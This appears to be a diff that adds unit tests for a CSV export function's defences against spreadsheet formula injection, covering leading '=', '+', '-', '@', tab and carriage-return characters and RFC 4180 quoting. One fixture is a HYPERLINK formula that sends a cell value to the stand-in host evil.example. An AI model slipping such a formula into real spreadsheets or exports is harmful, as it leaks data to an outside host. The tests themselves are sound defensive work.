@@ -109,6 +109,45 @@ describe('renderAtcsCsv', () => {
     const dataLines = csv.split('\r\n').filter(Boolean).slice(1);
     expect(dataLines.map(l => l.split(',')[0])).toEqual(['1', '3', '2']);
   });
+
+  describe('CSV formula-injection neutralization (Conductor review, PR #207 MAJOR finding)', () => {
+    it.each([
+      ['=HYPERLINK("https://evil.example/?d="&A1,"Open")', '\'=HYPERLINK'],
+      ['+1 234 5678', '\'+1 234'],
+      ['-1 offset bug', '\'-1 offset'],
+      ['@mobile flaky', '\'@mobile'],
+      ['\ttabbed title', '\'\ttabbed'],
+      ['\rcarriage title', '\'\rcarriage'],
+    ])('prefixes a title starting with %j with a literal-text marker', (title, expectedPrefix) => {
+      const csv = renderAtcsCsv([row({ title })]);
+      const dataLine = csv.split('\r\n')[1];
+      expect(dataLine).toContain(expectedPrefix);
+    });
+
+    it('does not touch a title that merely contains a trigger character mid-string', () => {
+      const csv = renderAtcsCsv([row({ title: 'Total = 5' })]);
+      const dataLine = csv.split('\r\n')[1];
+      expect(dataLine).toContain(',Total = 5,');
+    });
+
+    it('neutralizes a Tags cell that starts with a trigger character after joining', () => {
+      const csv = renderAtcsCsv([row({ title: 'Plain title', tags: ['=cmd', 'p1'] })]);
+      const dataLine = csv.split('\r\n')[1];
+      expect(dataLine).toContain('\'=cmd; p1');
+    });
+
+    it('neutralizes AND RFC4180-escapes a title that both triggers and needs quoting', () => {
+      const csv = renderAtcsCsv([row({ title: '=cmd, "danger"' })]);
+      const dataLine = csv.split('\r\n')[1];
+      expect(dataLine).toContain('"\'=cmd, ""danger"""');
+    });
+
+    it('leaves the ATC ID, Layer and Status columns untouched — none of them can start with a trigger character', () => {
+      const csv = renderAtcsCsv([row()]);
+      const dataLine = csv.split('\r\n')[1];
+      expect(dataLine.startsWith('11111111')).toBe(true);
+    });
+  });
 });
 
 describe('atcsExportFilename', () => {
